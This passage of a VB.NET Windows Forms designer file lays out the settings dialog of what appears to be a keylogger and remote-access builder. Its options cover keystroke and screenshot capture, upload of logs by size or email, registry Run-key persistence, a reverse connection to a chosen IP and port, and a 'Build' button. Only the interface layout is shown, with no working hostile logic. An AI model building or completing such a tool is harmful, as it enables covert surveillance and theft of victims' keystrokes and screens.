        Me.rdobtnKeyMonitorRootDirSystem = New System.Windows.Forms.RadioButton()
        Me.rdobtnKeyMonitorRootDirWindows = New System.Windows.Forms.RadioButton()
        Me.gbxKeyMonitorOptionsAdditional = New System.Windows.Forms.GroupBox()
        Me.gbxKeyMonitorFileExtn = New System.Windows.Forms.GroupBox()
        Me.lblFileExtnIcon = New System.Windows.Forms.Label()
        Me.rdobtnKeyMonitorFileExtnFILE = New System.Windows.Forms.RadioButton()
        Me.rdobtnKeyMonitorFileExtnTXT = New System.Windows.Forms.RadioButton()
        Me.rdobtnKeyMonitorFileExtnDAT = New System.Windows.Forms.RadioButton()
        Me.chkboxKeyMonitorUserNameOption = New System.Windows.Forms.CheckBox()
        Me.chkboxKeyMonitorTimeOption = New System.Windows.Forms.CheckBox()
        Me.chkboxKeyMonitorDateOption = New System.Windows.Forms.CheckBox()
        Me.lblFileUploadSize2 = New System.Windows.Forms.Label()
        Me.txtFileUploadSize = New System.Windows.Forms.TextBox()
        Me.lblFileUploadSize1 = New System.Windows.Forms.Label()
        Me.txtLogFileName = New System.Windows.Forms.TextBox()
        Me.lblLogFileName = New System.Windows.Forms.Label()
        Me.tabpgeScreenMonitorOptions = New System.Windows.Forms.TabPage()
        Me.gbxScreenSnatcherOptions = New System.Windows.Forms.GroupBox()
        Me.gbxScreenMonitorRootDir = New System.Windows.Forms.GroupBox()
        Me.rdobtnScreenMonitorRootDirProgramFiles = New System.Windows.Forms.RadioButton()
        Me.rdobtnScreenMonitorRootDirCommonFiles = New System.Windows.Forms.RadioButton()
        Me.rdobtnScreenMonitorRootDirSystem = New System.Windows.Forms.RadioButton()
        Me.rdobtnScreenMonitorRootDirWindows = New System.Windows.Forms.RadioButton()
        Me.gbxScreenMonitorOptionsAdditional = New System.Windows.Forms.GroupBox()
        Me.lblConst1 = New System.Windows.Forms.Label()
        Me.txtScreenMonitorIntervalsHours = New System.Windows.Forms.TextBox()
        Me.txtScreenMonitorIntervalsMinitues = New System.Windows.Forms.TextBox()
        Me.txtScreenMonitorIntervalsSeconds = New System.Windows.Forms.TextBox()
        Me.rdobtnScreenMonitorIntervalsHours = New System.Windows.Forms.RadioButton()
        Me.rdobtnScreenMonitorIntervalsMinitues = New System.Windows.Forms.RadioButton()
        Me.rdobtnScreenMonitorIntervalsSeconds = New System.Windows.Forms.RadioButton()
        Me.lblPictureLmt2 = New System.Windows.Forms.Label()
        Me.txtPictureLmt = New System.Windows.Forms.TextBox()
        Me.lblPictureLmt1 = New System.Windows.Forms.Label()
        Me.txtScreenMonitorDirName = New System.Windows.Forms.TextBox()
        Me.lblScreenMonitorDirName = New System.Windows.Forms.Label()
        Me.tabpgeWinMonitorServerOptions = New System.Windows.Forms.TabPage()
        Me.gbxWinMonitorOptions = New System.Windows.Forms.GroupBox()
        Me.btnWinMonitorNameAdvancedOptions = New System.Windows.Forms.Button()
        Me.btnWinMonitorBuild = New System.Windows.Forms.Button()
        Me.gbxWinMonitorRegisterLocations = New System.Windows.Forms.GroupBox()
        Me.gbxWinMonitorHKEY_LOCAL_USER = New System.Windows.Forms.GroupBox()
        Me.rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways = New System.Windows.Forms.CheckBox()
        Me.line8 = New System.Windows.Forms.Label()
        Me.line6 = New System.Windows.Forms.Label()
        Me.line5 = New System.Windows.Forms.Label()
        Me.line4 = New System.Windows.Forms.Label()
        Me.gbxWinMonitorHKEY_LOCAL_MACHINE = New System.Windows.Forms.GroupBox()
        Me.rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunAlways = New System.Windows.Forms.CheckBox()
        Me.rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunOnce = New System.Windows.Forms.CheckBox()
        Me.line3 = New System.Windows.Forms.Label()
        Me.line1 = New System.Windows.Forms.Label()
        Me.lblWinMonitorHKEY_LOCAL_USER = New System.Windows.Forms.Label()
        Me.lblWinMonitorHKEY_LOCAL_MACHINE = New System.Windows.Forms.Label()
        Me.txtWinMonitorTargetedHostName = New System.Windows.Forms.TextBox()
        Me.lblWinMonitorTargetedHostName = New System.Windows.Forms.Label()
        Me.btnWinMonitorSaveDir = New System.Windows.Forms.Button()
        Me.txtWinMonitorSaveDir = New System.Windows.Forms.TextBox()
        Me.lblWinMonitorSaveDir = New System.Windows.Forms.Label()
        Me.txtWinMonitorRegKeyName = New System.Windows.Forms.TextBox()
        Me.lblWinMonitorRegKeyName = New System.Windows.Forms.Label()
        Me.txtWinMonitorInternalName = New System.Windows.Forms.TextBox()
        Me.lblWinMonitorInternalName = New System.Windows.Forms.Label()
        Me.tabpgeNetworkMonitorOptions = New System.Windows.Forms.TabPage()
        Me.gbxNetworkMonitorOptions = New System.Windows.Forms.GroupBox()
        Me.lblNwMonitorEmailServer = New System.Windows.Forms.Label()
        Me.txtNwMonitorEmailServer = New System.Windows.Forms.TextBox()
        Me.chkboxNwMonitorEmail = New System.Windows.Forms.CheckBox()
        Me.txtNwMonitorEmail = New System.Windows.Forms.TextBox()
        Me.lblNwMonitorEmail = New System.Windows.Forms.Label()
        Me.pbxNwMonitorIcon = New System.Windows.Forms.PictureBox()
        Me.gbxNwMonitorReverseConnection = New System.Windows.Forms.GroupBox()
        Me.rdobtnReverseConnectionDisable = New System.Windows.Forms.RadioButton()
        Me.rdobtnReverseConnectionEnable = New System.Windows.Forms.RadioButton()
        Me.lblNwMonitorReverseConnectionAttempt2 = New System.Windows.Forms.Label()
        Me.lblNwMonitorReverseConnectionPort2 = New System.Windows.Forms.Label()
        Me.txtNwMonitorReverseConnectionIP = New System.Windows.Forms.TextBox()
        Me.txtNwMonitorReverseConnectionAttempt = New System.Windows.Forms.TextBox()
        Me.txtNwMonitorReverseConnectionPort = New System.Windows.Forms.TextBox()
        Me.lblNwMonitorReverseConnectionAttempt1 = New System.Windows.Forms.Label()
        Me.lblNwMonitorReverseConnectionPort1 = New System.Windows.Forms.Label()
        Me.lblNwMonitorReverseConnectionIP = New System.Windows.Forms.Label()
        Me.lblNwMonitorRePassword = New System.Windows.Forms.Label()
        Me.txtNwMonitorRePassword = New System.Windows.Forms.TextBox()
        Me.lblNwMonitorPassword = New System.Windows.Forms.Label()
        Me.txtNwMonitorPassword = New System.Windows.Forms.TextBox()
        Me.lblNwMonitorListenPort2 = New System.Windows.Forms.Label()
        Me.txtNwMonitorListenPort = New System.Windows.Forms.TextBox()
        Me.lblNwMonitorListenPort1 = New System.Windows.Forms.Label()
        Me.btnWinMonitorServerConfigOk = New System.Windows.Forms.Button()
        Me.btnWinMonitorServerConfigCancel = New System.Windows.Forms.Button()
        Me.tabWinMonitorServerConfigurations.SuspendLayout()
        Me.tabpgeKeyMonitorOptions.SuspendLayout()
        Me.gbxKeyMonitorOptions.SuspendLayout()
        Me.gbxKeyMonitorRootDir.SuspendLayout()
        Me.gbxKeyMonitorOptionsAdditional.SuspendLayout()
        Me.gbxKeyMonitorFileExtn.SuspendLayout()
        Me.tabpgeScreenMonitorOptions.SuspendLayout()
        Me.gbxScreenSnatcherOptions.SuspendLayout()
        Me.gbxScreenMonitorRootDir.SuspendLayout()
        Me.gbxScreenMonitorOptionsAdditional.SuspendLayout()
        Me.tabpgeWinMonitorServerOptions.SuspendLayout()
        Me.gbxWinMonitorOptions.SuspendLayout()
        Me.gbxWinMonitorRegisterLocations.SuspendLayout()
        Me.gbxWinMonitorHKEY_LOCAL_USER.SuspendLayout()
        Me.gbxWinMonitorHKEY_LOCAL_MACHINE.SuspendLayout()
        Me.tabpgeNetworkMonitorOptions.SuspendLayout()
        Me.gbxNetworkMonitorOptions.SuspendLayout()
        Me.gbxNwMonitorReverseConnection.SuspendLayout()
        Me.SuspendLayout()
        '
        'tabWinMonitorServerConfigurations
        '
        Me.tabWinMonitorServerConfigurations.Controls.AddRange(New System.Windows.Forms.Control() {Me.tabpgeKeyMonitorOptions, Me.tabpgeScreenMonitorOptions, Me.tabpgeWinMonitorServerOptions, Me.tabpgeNetworkMonitorOptions})
        Me.tabWinMonitorServerConfigurations.ItemSize = New System.Drawing.Size(110, 21)
        Me.tabWinMonitorServerConfigurations.Location = New System.Drawing.Point(6, 5)
        Me.tabWinMonitorServerConfigurations.Name = "tabWinMonitorServerConfigurations"
        Me.tabWinMonitorServerConfigurations.SelectedIndex = 0
        Me.tabWinMonitorServerConfigurations.ShowToolTips = True
        Me.tabWinMonitorServerConfigurations.Size = New System.Drawing.Size(507, 303)
        Me.tabWinMonitorServerConfigurations.TabIndex = 3
        '
        'tabpgeKeyMonitorOptions
        '
        Me.tabpgeKeyMonitorOptions.BackColor = System.Drawing.SystemColors.Control
        Me.tabpgeKeyMonitorOptions.Controls.AddRange(New System.Windows.Forms.Control() {Me.gbxKeyMonitorOptions})
        Me.tabpgeKeyMonitorOptions.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.tabpgeKeyMonitorOptions.ForeColor = System.Drawing.Color.Silver
        Me.tabpgeKeyMonitorOptions.Location = New System.Drawing.Point(4, 25)
        Me.tabpgeKeyMonitorOptions.Name = "tabpgeKeyMonitorOptions"
        Me.tabpgeKeyMonitorOptions.Size = New System.Drawing.Size(499, 274)
        Me.tabpgeKeyMonitorOptions.TabIndex = 0
        Me.tabpgeKeyMonitorOptions.Text = "Key Monitor Options"
        '
        'gbxKeyMonitorOptions
        '
        Me.gbxKeyMonitorOptions.Controls.AddRange(New System.Windows.Forms.Control() {Me.gbxKeyMonitorRootDir, Me.gbxKeyMonitorOptionsAdditional, Me.lblFileUploadSize2, Me.txtFileUploadSize, Me.lblFileUploadSize1, Me.txtLogFileName, Me.lblLogFileName})
        Me.gbxKeyMonitorOptions.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.gbxKeyMonitorOptions.ForeColor = System.Drawing.Color.Black
        Me.gbxKeyMonitorOptions.Name = "gbxKeyMonitorOptions"
        Me.gbxKeyMonitorOptions.Size = New System.Drawing.Size(498, 272)
        Me.gbxKeyMonitorOptions.TabIndex = 2
        Me.gbxKeyMonitorOptions.TabStop = False
        '
        'gbxKeyMonitorRootDir
        '
        Me.gbxKeyMonitorRootDir.Controls.AddRange(New System.Windows.Forms.Control() {Me.rdobtnKeyMonitorRootDirProgramFiles, Me.rdobtnKeyMonitorRootDirCommonFiles, Me.rdobtnKeyMonitorRootDirSystem, Me.rdobtnKeyMonitorRootDirWindows})
        Me.gbxKeyMonitorRootDir.ForeColor = System.Drawing.Color.Black
        Me.gbxKeyMonitorRootDir.Location = New System.Drawing.Point(376, 12)
        Me.gbxKeyMonitorRootDir.Name = "gbxKeyMonitorRootDir"
        Me.gbxKeyMonitorRootDir.Size = New System.Drawing.Size(112, 248)
        Me.gbxKeyMonitorRootDir.TabIndex = 7
        Me.gbxKeyMonitorRootDir.TabStop = False
        Me.gbxKeyMonitorRootDir.Text = " [ Root Directory ]"
        '
        'rdobtnKeyMonitorRootDirProgramFiles
        '
        Me.rdobtnKeyMonitorRootDirProgramFiles.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnKeyMonitorRootDirProgramFiles.Location = New System.Drawing.Point(8, 209)
        Me.rdobtnKeyMonitorRootDirProgramFiles.Name = "rdobtnKeyMonitorRootDirProgramFiles"
        Me.rdobtnKeyMonitorRootDirProgramFiles.Size = New System.Drawing.Size(100, 24)
        Me.rdobtnKeyMonitorRootDirProgramFiles.TabIndex = 3
        Me.rdobtnKeyMonitorRootDirProgramFiles.Text = "&Program Files"
        '
        'rdobtnKeyMonitorRootDirCommonFiles
        '
        Me.rdobtnKeyMonitorRootDirCommonFiles.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnKeyMonitorRootDirCommonFiles.Location = New System.Drawing.Point(8, 148)
        Me.rdobtnKeyMonitorRootDirCommonFiles.Name = "rdobtnKeyMonitorRootDirCommonFiles"
        Me.rdobtnKeyMonitorRootDirCommonFiles.Size = New System.Drawing.Size(102, 24)
        Me.rdobtnKeyMonitorRootDirCommonFiles.TabIndex = 2
        Me.rdobtnKeyMonitorRootDirCommonFiles.Text = "Co&mmon Files"
        '
        'rdobtnKeyMonitorRootDirSystem
        '
        Me.rdobtnKeyMonitorRootDirSystem.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnKeyMonitorRootDirSystem.Location = New System.Drawing.Point(8, 87)
        Me.rdobtnKeyMonitorRootDirSystem.Name = "rdobtnKeyMonitorRootDirSystem"
        Me.rdobtnKeyMonitorRootDirSystem.Size = New System.Drawing.Size(94, 24)
        Me.rdobtnKeyMonitorRootDirSystem.TabIndex = 1
        Me.rdobtnKeyMonitorRootDirSystem.Text = "&System"
        '
        'rdobtnKeyMonitorRootDirWindows
        '
        Me.rdobtnKeyMonitorRootDirWindows.Checked = True
        Me.rdobtnKeyMonitorRootDirWindows.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnKeyMonitorRootDirWindows.Location = New System.Drawing.Point(8, 26)
        Me.rdobtnKeyMonitorRootDirWindows.Name = "rdobtnKeyMonitorRootDirWindows"
        Me.rdobtnKeyMonitorRootDirWindows.Size = New System.Drawing.Size(94, 24)
        Me.rdobtnKeyMonitorRootDirWindows.TabIndex = 0
        Me.rdobtnKeyMonitorRootDirWindows.TabStop = True
        Me.rdobtnKeyMonitorRootDirWindows.Text = "&Windows"
        '
        'gbxKeyMonitorOptionsAdditional
        '
        Me.gbxKeyMonitorOptionsAdditional.Controls.AddRange(New System.Windows.Forms.Control() {Me.gbxKeyMonitorFileExtn, Me.chkboxKeyMonitorUserNameOption, Me.chkboxKeyMonitorTimeOption, Me.chkboxKeyMonitorDateOption})
        Me.gbxKeyMonitorOptionsAdditional.ForeColor = System.Drawing.Color.Black
        Me.gbxKeyMonitorOptionsAdditional.Location = New System.Drawing.Point(8, 92)
        Me.gbxKeyMonitorOptionsAdditional.Name = "gbxKeyMonitorOptionsAdditional"
        Me.gbxKeyMonitorOptionsAdditional.Size = New System.Drawing.Size(358, 168)
        Me.gbxKeyMonitorOptionsAdditional.TabIndex = 5
        Me.gbxKeyMonitorOptionsAdditional.TabStop = False
        '
        'gbxKeyMonitorFileExtn
        '
        Me.gbxKeyMonitorFileExtn.Controls.AddRange(New System.Windows.Forms.Control() {Me.lblFileExtnIcon, Me.rdobtnKeyMonitorFileExtnFILE, Me.rdobtnKeyMonitorFileExtnTXT, Me.rdobtnKeyMonitorFileExtnDAT})
        Me.gbxKeyMonitorFileExtn.Location = New System.Drawing.Point(202, 16)
        Me.gbxKeyMonitorFileExtn.Name = "gbxKeyMonitorFileExtn"
        Me.gbxKeyMonitorFileExtn.Size = New System.Drawing.Size(144, 142)
        Me.gbxKeyMonitorFileExtn.TabIndex = 3
        Me.gbxKeyMonitorFileExtn.TabStop = False
        Me.gbxKeyMonitorFileExtn.Text = " [ Log File Extension ]"
        '
        'lblFileExtnIcon
        '
        Me.lblFileExtnIcon.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblFileExtnIcon.Image = CType(resources.GetObject("lblFileExtnIcon.Image"), System.Drawing.Bitmap)
        Me.lblFileExtnIcon.Location = New System.Drawing.Point(76, 42)
        Me.lblFileExtnIcon.Name = "lblFileExtnIcon"
        Me.lblFileExtnIcon.Size = New System.Drawing.Size(54, 62)
        Me.lblFileExtnIcon.TabIndex = 3
        '
        'rdobtnKeyMonitorFileExtnFILE
        '
        Me.rdobtnKeyMonitorFileExtnFILE.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnKeyMonitorFileExtnFILE.Location = New System.Drawing.Point(10, 104)
        Me.rdobtnKeyMonitorFileExtnFILE.Name = "rdobtnKeyMonitorFileExtnFILE"
        Me.rdobtnKeyMonitorFileExtnFILE.Size = New System.Drawing.Size(56, 20)
        Me.rdobtnKeyMonitorFileExtnFILE.TabIndex = 2
        Me.rdobtnKeyMonitorFileExtnFILE.Text = ".&FILE"
        '
        'rdobtnKeyMonitorFileExtnTXT
        '
        Me.rdobtnKeyMonitorFileExtnTXT.Checked = True
        Me.rdobtnKeyMonitorFileExtnTXT.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnKeyMonitorFileExtnTXT.Location = New System.Drawing.Point(10, 66)
        Me.rdobtnKeyMonitorFileExtnTXT.Name = "rdobtnKeyMonitorFileExtnTXT"
        Me.rdobtnKeyMonitorFileExtnTXT.Size = New System.Drawing.Size(56, 20)
        Me.rdobtnKeyMonitorFileExtnTXT.TabIndex = 1
        Me.rdobtnKeyMonitorFileExtnTXT.TabStop = True
        Me.rdobtnKeyMonitorFileExtnTXT.Text = ".T&XT"
        '
        'rdobtnKeyMonitorFileExtnDAT
        '
        Me.rdobtnKeyMonitorFileExtnDAT.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnKeyMonitorFileExtnDAT.Location = New System.Drawing.Point(10, 28)
        Me.rdobtnKeyMonitorFileExtnDAT.Name = "rdobtnKeyMonitorFileExtnDAT"
        Me.rdobtnKeyMonitorFileExtnDAT.Size = New System.Drawing.Size(56, 22)
        Me.rdobtnKeyMonitorFileExtnDAT.TabIndex = 0
        Me.rdobtnKeyMonitorFileExtnDAT.Text = ".&DAT"
        '
        'chkboxKeyMonitorUserNameOption
        '
        Me.chkboxKeyMonitorUserNameOption.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.chkboxKeyMonitorUserNameOption.Location = New System.Drawing.Point(14, 122)
        Me.chkboxKeyMonitorUserNameOption.Name = "chkboxKeyMonitorUserNameOption"
        Me.chkboxKeyMonitorUserNameOption.Size = New System.Drawing.Size(248, 24)
        Me.chkboxKeyMonitorUserNameOption.TabIndex = 2
        Me.chkboxKeyMonitorUserNameOption.Text = "Include &user name with keystrokes"
        '
        'chkboxKeyMonitorTimeOption
        '
        Me.chkboxKeyMonitorTimeOption.Checked = True
        Me.chkboxKeyMonitorTimeOption.CheckState = System.Windows.Forms.CheckState.Checked
        Me.chkboxKeyMonitorTimeOption.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.chkboxKeyMonitorTimeOption.Location = New System.Drawing.Point(14, 76)
        Me.chkboxKeyMonitorTimeOption.Name = "chkboxKeyMonitorTimeOption"
        Me.chkboxKeyMonitorTimeOption.Size = New System.Drawing.Size(214, 24)
        Me.chkboxKeyMonitorTimeOption.TabIndex = 1
        Me.chkboxKeyMonitorTimeOption.Text = "Include &time with keystrokes"
        '
        'chkboxKeyMonitorDateOption
        '
        Me.chkboxKeyMonitorDateOption.Checked = True
        Me.chkboxKeyMonitorDateOption.CheckState = System.Windows.Forms.CheckState.Checked
        Me.chkboxKeyMonitorDateOption.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.chkboxKeyMonitorDateOption.Location = New System.Drawing.Point(14, 32)
        Me.chkboxKeyMonitorDateOption.Name = "chkboxKeyMonitorDateOption"
        Me.chkboxKeyMonitorDateOption.Size = New System.Drawing.Size(212, 18)
        Me.chkboxKeyMonitorDateOption.TabIndex = 0
        Me.chkboxKeyMonitorDateOption.Text = "Include dat&e with keystrokes"
        '
        'lblFileUploadSize2
        '
        Me.lblFileUploadSize2.ForeColor = System.Drawing.Color.Black
        Me.lblFileUploadSize2.Location = New System.Drawing.Point(232, 56)
        Me.lblFileUploadSize2.Name = "lblFileUploadSize2"
        Me.lblFileUploadSize2.Size = New System.Drawing.Size(126, 21)
        Me.lblFileUploadSize2.TabIndex = 4
        Me.lblFileUploadSize2.Text = "bytes long, upload it."
        Me.lblFileUploadSize2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'txtFileUploadSize
        '
        Me.txtFileUploadSize.BackColor = System.Drawing.SystemColors.Window
        Me.txtFileUploadSize.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtFileUploadSize.Location = New System.Drawing.Point(114, 56)
        Me.txtFileUploadSize.MaxLength = 10
        Me.txtFileUploadSize.Name = "txtFileUploadSize"
        Me.txtFileUploadSize.Size = New System.Drawing.Size(117, 21)
        Me.txtFileUploadSize.TabIndex = 3
        Me.txtFileUploadSize.Text = ""
        Me.txtFileUploadSize.TextAlign = System.Windows.Forms.HorizontalAlignment.Right
        '
        'lblFileUploadSize1
        '
        Me.lblFileUploadSize1.ForeColor = System.Drawing.Color.Black
        Me.lblFileUploadSize1.Location = New System.Drawing.Point(8, 56)
        Me.lblFileUploadSize1.Name = "lblFileUploadSize1"
        Me.lblFileUploadSize1.Size = New System.Drawing.Size(102, 21)
        Me.lblFileUploadSize1.TabIndex = 2
        Me.lblFileUploadSize1.Text = "When log gets"
        Me.lblFileUploadSize1.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'txtLogFileName
        '
        Me.txtLogFileName.BackColor = System.Drawing.SystemColors.Window
        Me.txtLogFileName.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtLogFileName.Location = New System.Drawing.Point(114, 18)
        Me.txtLogFileName.MaxLength = 9000
        Me.txtLogFileName.Name = "txtLogFileName"
        Me.txtLogFileName.Size = New System.Drawing.Size(250, 21)
        Me.txtLogFileName.TabIndex = 1
        Me.txtLogFileName.Text = ""
        '
        'lblLogFileName
        '
        Me.lblLogFileName.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblLogFileName.ForeColor = System.Drawing.Color.Black
        Me.lblLogFileName.Location = New System.Drawing.Point(8, 16)
        Me.lblLogFileName.Name = "lblLogFileName"
        Me.lblLogFileName.Size = New System.Drawing.Size(102, 21)
        Me.lblLogFileName.TabIndex = 0
        Me.lblLogFileName.Text = "Key Log File Name"
        Me.lblLogFileName.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'tabpgeScreenMonitorOptions
        '
        Me.tabpgeScreenMonitorOptions.BackColor = System.Drawing.SystemColors.Control
        Me.tabpgeScreenMonitorOptions.Controls.AddRange(New System.Windows.Forms.Control() {Me.gbxScreenSnatcherOptions})
        Me.tabpgeScreenMonitorOptions.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.tabpgeScreenMonitorOptions.Location = New System.Drawing.Point(4, 25)
        Me.tabpgeScreenMonitorOptions.Name = "tabpgeScreenMonitorOptions"
        Me.tabpgeScreenMonitorOptions.Size = New System.Drawing.Size(499, 274)
        Me.tabpgeScreenMonitorOptions.TabIndex = 1
        Me.tabpgeScreenMonitorOptions.Text = "Screen Monitor Options"
        '
        'gbxScreenSnatcherOptions
        '
        Me.gbxScreenSnatcherOptions.Controls.AddRange(New System.Windows.Forms.Control() {Me.gbxScreenMonitorRootDir, Me.gbxScreenMonitorOptionsAdditional, Me.lblPictureLmt2, Me.txtPictureLmt, Me.lblPictureLmt1, Me.txtScreenMonitorDirName, Me.lblScreenMonitorDirName})
        Me.gbxScreenSnatcherOptions.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.gbxScreenSnatcherOptions.ForeColor = System.Drawing.Color.Black
        Me.gbxScreenSnatcherOptions.Name = "gbxScreenSnatcherOptions"
        Me.gbxScreenSnatcherOptions.Size = New System.Drawing.Size(498, 272)
        Me.gbxScreenSnatcherOptions.TabIndex = 3
        Me.gbxScreenSnatcherOptions.TabStop = False
        '
        'gbxScreenMonitorRootDir
        '
        Me.gbxScreenMonitorRootDir.Controls.AddRange(New System.Windows.Forms.Control() {Me.rdobtnScreenMonitorRootDirProgramFiles, Me.rdobtnScreenMonitorRootDirCommonFiles, Me.rdobtnScreenMonitorRootDirSystem, Me.rdobtnScreenMonitorRootDirWindows})
        Me.gbxScreenMonitorRootDir.Location = New System.Drawing.Point(376, 12)
        Me.gbxScreenMonitorRootDir.Name = "gbxScreenMonitorRootDir"
        Me.gbxScreenMonitorRootDir.Size = New System.Drawing.Size(112, 248)
        Me.gbxScreenMonitorRootDir.TabIndex = 12
        Me.gbxScreenMonitorRootDir.TabStop = False
        Me.gbxScreenMonitorRootDir.Text = " [ Root Directory ]"
        '
        'rdobtnScreenMonitorRootDirProgramFiles
        '
        Me.rdobtnScreenMonitorRootDirProgramFiles.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnScreenMonitorRootDirProgramFiles.Location = New System.Drawing.Point(8, 209)
        Me.rdobtnScreenMonitorRootDirProgramFiles.Name = "rdobtnScreenMonitorRootDirProgramFiles"
        Me.rdobtnScreenMonitorRootDirProgramFiles.Size = New System.Drawing.Size(102, 24)
        Me.rdobtnScreenMonitorRootDirProgramFiles.TabIndex = 16
        Me.rdobtnScreenMonitorRootDirProgramFiles.Text = "&Program Files"
        '
        'rdobtnScreenMonitorRootDirCommonFiles
        '
        Me.rdobtnScreenMonitorRootDirCommonFiles.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnScreenMonitorRootDirCommonFiles.Location = New System.Drawing.Point(8, 148)
        Me.rdobtnScreenMonitorRootDirCommonFiles.Name = "rdobtnScreenMonitorRootDirCommonFiles"
        Me.rdobtnScreenMonitorRootDirCommonFiles.Size = New System.Drawing.Size(102, 24)
        Me.rdobtnScreenMonitorRootDirCommonFiles.TabIndex = 15
        Me.rdobtnScreenMonitorRootDirCommonFiles.Text = "Co&mmon Files"
        '
        'rdobtnScreenMonitorRootDirSystem
        '
        Me.rdobtnScreenMonitorRootDirSystem.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnScreenMonitorRootDirSystem.Location = New System.Drawing.Point(8, 87)
        Me.rdobtnScreenMonitorRootDirSystem.Name = "rdobtnScreenMonitorRootDirSystem"
        Me.rdobtnScreenMonitorRootDirSystem.Size = New System.Drawing.Size(102, 24)
        Me.rdobtnScreenMonitorRootDirSystem.TabIndex = 14
        Me.rdobtnScreenMonitorRootDirSystem.Text = "&System"
        '
        'rdobtnScreenMonitorRootDirWindows
        '
        Me.rdobtnScreenMonitorRootDirWindows.Checked = True
        Me.rdobtnScreenMonitorRootDirWindows.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnScreenMonitorRootDirWindows.Location = New System.Drawing.Point(8, 26)
        Me.rdobtnScreenMonitorRootDirWindows.Name = "rdobtnScreenMonitorRootDirWindows"
        Me.rdobtnScreenMonitorRootDirWindows.Size = New System.Drawing.Size(102, 24)
        Me.rdobtnScreenMonitorRootDirWindows.TabIndex = 13
        Me.rdobtnScreenMonitorRootDirWindows.TabStop = True
        Me.rdobtnScreenMonitorRootDirWindows.Text = "&Windows"
        '
        'gbxScreenMonitorOptionsAdditional
        '
        Me.gbxScreenMonitorOptionsAdditional.Controls.AddRange(New System.Windows.Forms.Control() {Me.lblConst1, Me.txtScreenMonitorIntervalsHours, Me.txtScreenMonitorIntervalsMinitues, Me.txtScreenMonitorIntervalsSeconds, Me.rdobtnScreenMonitorIntervalsHours, Me.rdobtnScreenMonitorIntervalsMinitues, Me.rdobtnScreenMonitorIntervalsSeconds})
        Me.gbxScreenMonitorOptionsAdditional.Location = New System.Drawing.Point(8, 92)
        Me.gbxScreenMonitorOptionsAdditional.Name = "gbxScreenMonitorOptionsAdditional"
        Me.gbxScreenMonitorOptionsAdditional.Size = New System.Drawing.Size(354, 168)
        Me.gbxScreenMonitorOptionsAdditional.TabIndex = 5
        Me.gbxScreenMonitorOptionsAdditional.TabStop = False
        '
        'lblConst1
        '
        Me.lblConst1.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblConst1.ForeColor = System.Drawing.Color.FromArgb(CType(0, Byte), CType(0, Byte), CType(192, Byte))
        Me.lblConst1.Image = CType(resources.GetObject("lblConst1.Image"), System.Drawing.Bitmap)
        Me.lblConst1.ImageAlign = System.Drawing.ContentAlignment.TopLeft
        Me.lblConst1.Location = New System.Drawing.Point(266, 30)
        Me.lblConst1.Name = "lblConst1"
        Me.lblConst1.Size = New System.Drawing.Size(72, 118)
        Me.lblConst1.TabIndex = 11
        Me.lblConst1.Text = "Save File Extension     .BMP"
        Me.lblConst1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'txtScreenMonitorIntervalsHours
        '
        Me.txtScreenMonitorIntervalsHours.BackColor = System.Drawing.SystemColors.Window
        Me.txtScreenMonitorIntervalsHours.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtScreenMonitorIntervalsHours.Location = New System.Drawing.Point(142, 126)
        Me.txtScreenMonitorIntervalsHours.MaxLength = 5
        Me.txtScreenMonitorIntervalsHours.Name = "txtScreenMonitorIntervalsHours"
        Me.txtScreenMonitorIntervalsHours.Size = New System.Drawing.Size(64, 21)
        Me.txtScreenMonitorIntervalsHours.TabIndex = 11
        Me.txtScreenMonitorIntervalsHours.Text = ""
        Me.txtScreenMonitorIntervalsHours.TextAlign = System.Windows.Forms.HorizontalAlignment.Right
        '
        'txtScreenMonitorIntervalsMinitues
        '
        Me.txtScreenMonitorIntervalsMinitues.BackColor = System.Drawing.SystemColors.Window
        Me.txtScreenMonitorIntervalsMinitues.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtScreenMonitorIntervalsMinitues.Location = New System.Drawing.Point(142, 80)
